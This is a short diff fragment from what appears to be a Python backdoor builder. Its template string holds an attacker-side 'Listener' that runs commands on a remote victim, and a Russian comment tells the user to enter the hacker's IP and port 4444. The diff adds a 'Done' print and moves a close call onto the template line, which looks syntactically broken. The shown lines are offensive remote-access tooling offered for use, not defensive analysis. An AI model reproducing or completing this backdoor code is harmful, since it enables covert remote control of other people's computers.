@@ -233,8 +233,8 @@ class Listener:
 			result = self.execute_remotely(command)
 			print(result)
 my_listener = Listener('"""+str(ip)+""", 4444')  #ip  хакера и лбой порт 4444 8080 и т.д Обезательно!
-my_listener.go() """
-			n.close()
+my_listener.go() """	n.close()
+			print('Готово')
 			break
 				
 		BackdoorC():
